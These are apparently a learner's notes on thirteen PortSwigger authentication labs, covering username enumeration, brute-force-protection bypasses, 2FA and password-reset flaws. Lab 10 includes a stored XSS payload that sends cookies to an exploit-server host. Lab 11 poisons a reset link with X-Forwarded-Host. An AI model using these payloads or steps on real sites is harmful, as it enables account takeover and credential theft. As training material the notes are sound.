Portswigger Authentication: https://portswigger.net/web-security/authentication#what-is-authentication

# 1)Lab: Username enumeration via different responses
lab:https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

Lab Video(Rana khalil): https://www.youtube.com/watch?v=DEUCRYGt3TY&ab_channel=RanaKhalil


This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.


#### Solution

1. With Burp running, investigate the login page and submit an invalid username and password.
2. In Burp, go to **Proxy > HTTP history** and find the `POST /login` request. Highlight the value of the `username` parameter in the request and send it to Burp Intruder.
3. In Burp Intruder, notice that the `username` parameter is automatically set as a payload position. This position is indicated by two `§` symbols, for example: `username=§invalid-username§`. Leave the password as any static value for now.
4. Make sure that **Sniper attack** is selected.
5. In the **Payloads** side panel, make sure that the **Simple list** payload type is selected.
6. Under **Payload configuration**, paste the list of candidate usernames. Finally, click  **Start attack**. The attack will start in a new window.
7. When the attack is finished, examine the **Length** column in the results table. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message `Invalid username`, but this response says `Incorrect password`. Make a note of the username in the **Payload** column.
8. Close the attack and go back to the **Intruder** tab. Click **Clear §**, then change the `username` parameter to the username you just identified. Add a payload position to the `password` parameter. The result should look something like this:
    
    `username=identified-user&password=§invalid-password§`
9. In the **Payloads** side panel, clear the list of usernames and replace it with the list of candidate passwords. Click  **Start attack**.
10. When the attack is finished, look at the **Status** column. Notice that each request received a response with a `200` status code except for one, which got a `302` response. This suggests that the login attempt was successful - make a note of the password in the **Payload** column.
11. Log in using the username and password that you identified and access the user account page to solve the lab.

```
Note: Solution i found was :- username=ec2-user&password=654321
```


# 2)Lab: 2FA simple bypass
Lab:https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
Lab Video: https://www.youtube.com/watch?v=2WpBVanEn3M&ab_channel=RanaKhalil


This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

- Your credentials: `wiener:peter`
- Victim's credentials `carlos:montoya`



 ####  Solution

1. Log in to your own account. Your 2FA verification code will be sent to you by email. Click the **Email client** button to access your emails.
2. Go to your account page and make a note of the URL.

URL: https://0a87007e0461e262d0b33d9c00010016.web-security-academy.net/my-account?id=wiener
3. Log out of your account.
4. Log in using the victim's credentials.
5. When prompted for the verification code, manually change the URL to navigate to `/my-account`. The lab is solved when the page loads.



# 3) Lab: Password reset broken logic

Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

Lab Video: https://www.youtube.com/watch?v=GtTk78pyLPI&ab_channel=RanaKhalil

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`



 ####  Solution

1. With Burp running, click the **Forgot your password?** link and enter your own username.
2. Click the **Email client** button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.
3. In Burp, go to **Proxy > HTTP history** and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the `POST /forgot-password?temp-forgot-password-token` request contains the username as hidden input. Send this request to Burp Repeater.
4. In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the `temp-forgot-password-token` parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password.
5. In the browser, request a new password reset and change your password again. Send the `POST /forgot-password?temp-forgot-password-token` request to Burp Repeater again.
6. In Burp Repeater, delete the value of the `temp-forgot-password-token` parameter in both the URL and request body. Change the `username` parameter to `carlos`. Set the new password to whatever you want and send the request.
7. In the browser, log in to Carlos's account using the new password you just set. Click **My account** to solve the lab.
Note:
```
This was the actual request:

POST /forgot-password?temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8 HTTP/2
Host: 0a3d00490439880f8048035900340023.web-security-academy.net
Cookie: session=lTHxOhZ3Bx8s6HXJnTqhPByn4OpVhvFz
Content-Length: 117
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Origin: https://0a3d00490439880f8048035900340023.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3d00490439880f8048035900340023.web-security-academy.net/forgot-password?temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8&username=wiener&new-password-1=peter&new-password-2=peter
```


**This was the manipulated request :** as told to do in step 6
```
POST /forgot-password?temp-forgot-password-token=x HTTP/2
Host: 0a3d00490439880f8048035900340023.web-security-academy.net
Cookie: session=lTHxOhZ3Bx8s6HXJnTqhPByn4OpVhvFz
Content-Length: 86
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Origin: https://0a3d00490439880f8048035900340023.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3d00490439880f8048035900340023.web-security-academy.net/forgot-password?temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

temp-forgot-password-token=x&username=carlos&new-password-1=peter&new-password-2=peter
```


# 4)Lab: Username enumeration via subtly different responses

Lab: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

Lab Video: https://www.youtube.com/watch?v=1pZTGqBgejU&ab_channel=RanaKhalil



This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.


 ####  Solution

1. With Burp running, submit an invalid username and password. Highlight the `username` parameter in the `POST /login` request and send it to Burp Intruder.
2. Go to **Intruder**. Notice that the `username` parameter is automatically marked as a payload position.
3. In the **Payloads** side panel, make sure that the **Simple list** payload type is selected and add the list of candidate usernames.
4. Click on the  **Settings** tab to open the **Settings** side panel. Under **Grep - Extract**, click **Add**. In the dialog that appears, scroll down through the response until you find the error message `Invalid username or password.`. Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click **OK** and then start the attack.
5. When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different.
6. Look closer at this response and notice that it contains a typo in the error message - instead of a full stop/period, there is a trailing space. Make a note of this username.
7. Close the results window and go back to the **Intruder** tab. Insert the username you just identified and add a payload position to the `password` parameter:
    
    `username=identified-user&password=§invalid-password§`
8. In the **Payloads** side panel, clear the list of usernames and replace it with the list of passwords. Start the attack.
9. When the attack is finished, notice that one of the requests received a `302` response. Make a note of this password.
10. Log in using the username and password that you identified and access the user account page to solve the lab.


Analysis:

username -> user
password -> qwerty

**Note:** ==in intruder this "negative search" when checked, helps to search which response dont have the value we are seraching.==
![[Screenshot From 2025-02-03 12-38-21.png]]



# 5)Lab: Username enumeration via response timing
Lab: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

Lab Video: https://www.youtube.com/watch?v=Non_U2tGG6o&ab_channel=RanaKhalil


This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

- Your credentials: `wiener:peter`
- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)


#### Hint

To add to the challenge, the lab also implements a form of IP-based brute-force protection. However, this can be easily bypassed by manipulating HTTP request headers.




 ####  Solution

1. With Burp running, submit an invalid username and password, then send the `POST /login` request to Burp Repeater. Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts.
2. Identify that the `X-Forwarded-For` header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.
3. Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.
4. Send this request to Burp Intruder and select **Pitchfork attack** from the attack type drop-down menu. Add the `X-Forwarded-For` header.
5. Add payload positions for the `X-Forwarded-For` header and the `username` parameter. Set the password to a very long string of characters (about 100 characters should do it).
6. In the **Payloads** side panel, select position `1` from the **Payload position** drop-down list. Select the **Numbers** payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.
7. Select position `2` from the **Payload position** drop-down list, then add the list of usernames. Start the attack.
8. When the attack finishes, at the top of the dialog, click **Columns** and select the **Response received** and **Response completed** options. These two columns are now displayed in the results table.
9. Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username.
10. Create a new Burp Intruder attack for the same request. Add the `X-Forwarded-For` header again and add a payload position to it. Insert the username that you just identified and add a payload position to the `password` parameter.
11. In the **Payloads** side panel, add the list of numbers to payload position 1 and add the list of passwords to payload position 2. Start the attack.
12. When the attack is finished, find the response with a `302` status. Make a note of this password.
13. Log in using the username and password that you identified and access the user account page to solve the lab.

Note: 
1) `X-Forwarded-For: 5` this header can be used to change the requests ip address. if not proper validation put in ip blocking mechanism for rate limiting.
2) Sometimes web applications first , check if username is valid if yes, then they check if pw is valid. this can be exploited to find correct username , by inputting large string in PW field. if username was invalid , the PW wont be checked and response will take less time, if username was correct the Large string PW will be checked which will take more time for response. Hence you will find the legit username.
3) Learned about Pitch fork attack in intruder, with using payload on  X-Forwarded-For: , Username, than after found username , using username to do another  Pitch fork attack on X-Forwarded-For: , password.

# 6)Lab: Broken brute-force protection, IP block
Lab : https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

Lab Video: https://www.youtube.com/watch?v=qXt5yqGa8ZA&ab_channel=RanaKhalil

Turbo intruder script used in this labs auth logic:  https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/broken-authentication/lab-06/authentication-lab-06-usernames.py



This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)


 ####  Hint

Advanced users may want to solve this lab by using a macro or the Turbo Intruder extension. However, it is possible to solve the lab without using these advanced features.

[ACCESS THE LAB](https://portswigger.net/academy/labs/launch/6d4cc1c44751ee06710496ea067aa78c8b2cb01e7686737e13a7e88261d1471a?referrer=%2fweb-security%2fauthentication%2fpassword-based%2flab-broken-bruteforce-protection-ip-block)


 ####  Solution

1. With Burp running, investigate the login page. Observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.
2. Enter an invalid username and password, then send the `POST /login` request to Burp Intruder. Create a pitchfork attack with payload positions in both the `username` and `password` parameters.
3. Click  **Resource pool** to open the **Resource pool** side panel, then add the attack to a resource pool with **Maximum concurrent requests** set to `1`. By only sending one request at a time, you can ensure that your login attempts are sent to the server in the correct order.
4. Click  **Payloads** to open the **Payloads** side panel, then select position `1` from the **Payload position** drop-down list. Add a list of payloads that alternates between your username and `carlos`. Make sure that your username is first and that `carlos` is repeated at least 100 times.
5. Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list.
6. Select position `2` from the **Payload position** drop-down list, then add the password list. Start the attack.
7. When the attack finishes, filter the results to hide responses with a `200` status code. Sort the remaining results by username. There should only be a single `302` response for requests with the username `carlos`. Make a note of the password from the **Payload 2** column.
8. Log in to Carlos's account using the password that you identified and access his account page to solve the lab.


# 7)Lab: Username enumeration via account lock

Lab: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

Lab Video: https://www.youtube.com/watch?v=fT31xo1cUoM&ab_channel=RanaKhalil

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

 
 ####  Solution

1. With Burp running, investigate the login page and submit an invalid username and password. Send the `POST /login` request to Burp Intruder.
2. Select **Cluster bomb attack** from the attack type drop-down menu. Add a payload position to the `username` parameter. Add a blank payload position to the end of the request body by clicking **Add §**. The result should look something like this:
    
    `username=§invalid-username§&password=example§§`
3. In the **Payloads** side panel, add the list of usernames for the first payload position. For the second payload position, select the **Null payloads** type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.
4. In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: `You have made too many incorrect login attempts.` Make a note of this username.
5. Create a new Burp Intruder attack on the `POST /login` request, but this time select **Sniper attack** from the attack type drop-down menu. Set the `username` parameter to the username that you just identified and add a payload position to the `password` parameter.
6. Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.
7. In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.
8. Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.



# 8)Lab: 2FA broken logic

Lab: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

Lab Video: https://www.youtube.com/watch?v=dpcrsQ2nhBo&ab_channel=RanaKhalil


This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

You also have access to the email server to receive your 2FA verification code.


#### Hint

Carlos will not attempt to log in to the website himself.


#### Solution

1. With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the `POST /login2` request, the `verify` parameter is used to determine which user's account is being accessed.
2. Log out of your account.
3. Send the `GET /login2` request to Burp Repeater. Change the value of the `verify` parameter to `carlos` and send the request. This ensures that a temporary 2FA code is generated for Carlos.
4. Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
5. Send the `POST /login2` request to Burp Intruder.
6. In Burp Intruder, set the `verify` parameter to `carlos` and add a payload position to the `mfa-code` parameter. Brute-force the verification code.
7. Load the 302 response in the browser.
8. Click **My account** to solve the lab.

Analysis: 

```
req of intrest:

1) login req that take id and pw
2) otp sent to user email req
3) submit otp req


Vulnerablity found :
1) session token broken(even if deleted from req, the req works 200)
2) the 2fa depends on client side param(i.e Cookie: verify=wiener;)
3) by using the happy flow of 2fa login we found "4 digit" otp format is used, then we found no rate limiting on otp, so we did bruteforce on other users otp by changing the name of user in request(Cookie: verify=carlos;) and removing session token.
```


# 9)Lab: Brute-forcing a stay-logged-in cookie

lab: http://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

Lab Vid: https://www.youtube.com/watch?v=T4iWTjRALNg&ab_channel=RanaKhalil

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his **My account** page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)


 ####  Solution

1. With Burp running, log in to your own account with the **Stay logged in** option selected. Notice that this sets a `stay-logged-in` cookie.
2. Examine this cookie in the [Inspector](https://portswigger.net/burp/documentation/desktop/tools/inspector) panel and notice that it is Base64-encoded. Its decoded value is `wiener:51dc30ddc473d43a6011e9ebba6ca770`. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:
    
    `base64(username+':'+md5HashOfPassword)`
3. Log out of your account.
4. In the most recent `GET /my-account?id=wiener` request highlight the `stay-logged-in` cookie parameter and send the request to Burp Intruder.
5. In Burp Intruder, notice that the `stay-logged-in` cookie has been automatically added as a payload position. Add your own password as a single payload.
6. Under **Payload processing**, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.
    - Hash: `MD5`
    - Add prefix: `wiener:`
    - Encode: `Base64-encode`
7. As the **Update email** button is only displayed when you access the **My account** page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the  **Settings** side panel, add a grep match rule to flag any responses containing the string `Update email`. Start the attack.
8. Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.
9. Make the following adjustments and then repeat this attack:
    - Remove your own password from the payload list and add the list of [candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) instead.
    - Change the `id` parameter in the request URL to `carlos` instead of `wiener`.
    - Change the **Add prefix** rule to add `carlos:` instead of `wiener:`.
10. When the attack is finished, the lab will be solved. Notice that only one request returned a response containing `Update email`. The payload from this request is the valid `stay-logged-in` cookie for Carlos's account.

Analysis: 
- capture multiple  req (eg: login req) to check which cookies are being generated randomly and changes at every request, do the same for responses - send multiple req and check in response which cookies values change randomly at every response, and which cookies value stay the same at every response.
- you can now decode the persistent cookie, that does not generates randomly,(first find out what encryption or hash it is by using chatgpt,hashcat,burp-decoder or crackstaion. etc)

- use crackstation to check the format of hash/encryption text you found
(https://crackstation.net)


i.e for this cookie: 
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw;

step 1 ) burp decoder-  Examine this cookie in the decoder panel and notice that it is Base64-encoded.

step2)Its decoded value is `wiener:51dc30ddc473d43a6011e9ebba6ca770`. Study the length and character set of this string and notice that it could be an MD5 hash

step 3) then use crackstation to break md5

process on actual token : 

token: d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
burp-decoder(base64) : wiener:51dc30ddc473d43a6011e9ebba6ca770
now take:  51dc30ddc473d43a6011e9ebba6ca770  (understand this is MD5)

put in crackstation: 51dc30ddc473d43a6011e9ebba6ca770
decode string: peter


hence the 
d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
is
wiener:peter



now enumerating another user: 
- base64(username:md5(password))
- base64(carlos:md5(x))
- for real life pentest never use online crackers, instead use offline tools like hashcat

as shown in the SS this is how you create the payload in intruder : base64(username:md5(password)) , for  stay-logged-in cookie .
![[Screenshot From 2025-02-07 14-55-49.png]]



# 10)Lab: Offline password cracking

Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
Lab Video: https://www.youtube.com/watch?v=RFt3YbGDkQ4&ab_channel=RanaKhalil

This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`


 ####  Solution

1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
2. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:
    
    `username+':'+md5HashOfPassword`
3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
4. Go to the exploit server and make a note of the URL.
5. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:
    
    `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
6. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
7. Decode the cookie in Burp Decoder. The result will be:
    
    `carlos:26323c16d5f4dabff3bb136f2460a943`
8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.

Analysis:

i am using hashcat to crack hash

To crack the hash using **Hashcat**, you first need to identify the hash type.
- You can use [Hash-Identifier](https://github.com/blackploit/hash-identifier) or [hashid](https://github.com/psypanda/hashID) to determine the type:
- `hashid 51dc30ddc473d43a6011e9ebba6ca770`

this d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw  is wiener:peter

xss payload: 
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
(this extract the cookie of any user who visit xss vulnerable sites(post, blog etc) and send it to attackers server)


victim user found:
carlos:onceuponatime


# 11)Lab: Password reset poisoning via middleware

Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware
Lab video: https://www.youtube.com/watch?v=7_RvLi6fdr0&ab_channel=RanaKhalil

This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

#### Solution

1. With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.
2. Send the `POST /forgot-password` request to Burp Repeater. Notice that the `X-Forwarded-Host` header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
3. Go to the exploit server and make a note of your exploit server URL.
4. Go back to the request in Burp Repeater and add the `X-Forwarded-Host` header with your exploit server URL:
    
    `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
5. Change the `username` parameter to `carlos` and send the request.
6. Go to the exploit server and open the access log. You should see a `GET /forgot-password` request, which contains the victim's token as a query parameter. Make a note of this token.
7. Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into the browser and change the value of the `temp-forgot-password-token` parameter to the value that you stole from the victim.
8. Load this URL and set a new password for Carlos's account.
9. Log in to Carlos's account using the new password to solve the lab.

Analysis:

**==we have:==** 
our user : `wiener:peter`
victim user: carlos

Exploit server: it has `email client` that shows the (forgot pw) email recived in inbox for wiener.
Also it has Access log. 

POC to solve lab:
- first use wiener , in forgot pw field, capture the req and send to repeater.
- also see when forgot PW hit for wiener, email client(email inbox) for wiener recived forgot pw link,
take that req and send to repeater as well.
- take the first req of forgot pw and input `X-Forwarded-Host`:  with the exploit server url as host.
- see that the req was forwarded to exploit server .
- now change the username to Carlos and hit it again, see the forgot pw link was sent in our email inbox( that was of wiener) since the `X-Forwarded-Host` value is of our exploit server that is connected to the wiener email.
- now for the forgot pw link req, first go to access log and find the token of carlos and replace it in the forgot pw link req .
- input desired pw and hit req of ,forgot pw link . the carlos pw is changed since we used carlos token.

# 12)Lab: Password brute-force via password change

Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
Lab Video: https://www.youtube.com/watch?v=tiIg6mGiTKI&ab_channel=RanaKhalil

This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

#### Solution

1. With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.
2. Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states `Current password is incorrect`. If you enter a valid current password, but two different new passwords, the message says `New passwords do not match`. We can use this message to enumerate correct passwords.
3. Enter your correct current password and two new passwords that do not match. Send this `POST /my-account/change-password` request to Burp Intruder.
4. In Burp Intruder, change the `username` parameter to `carlos` and add a payload position to the `current-password` parameter. Make sure that the new password parameters are set to two different values. For example:
```
 username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc
```
5. In the **Payloads** side panel, enter the list of passwords as the payload set.
6. Click  **Settings** to open the **Settings** side panel, then add a grep match rule to flag responses containing `New passwords do not match`. Start the attack.
7. When the attack finished, notice that one response was found that contains the `New passwords do not match` message. Make a note of this password.
8. In the browser, log out of your own account and lock back in with the username `carlos` and the password that you just identified.
9. Click **My account** to solve the lab.

# 13)Lab: Broken brute-force protection, multiple credentials per request

Lab: https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

Lab Video: 

This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)


 ####  Solution

1. With Burp running, investigate the login page. Notice that the `POST /login` request submits the login credentials in `JSON` format. Send this request to Burp Repeater.
2. In Burp Repeater, replace the single string value of the password with an array of strings containing all of the candidate passwords. For example:
`"username" : "carlos", "password" : [ "123456", "password", "qwerty" ... ]`

3. Send the request. This will return a 302 response.
4. Right-click on this request and select **Show response in browser**. Copy the URL and load it in the browser. The page loads and you are logged in as `carlos`.
5. Click **My account** to access Carlos's account page and solve the lab.

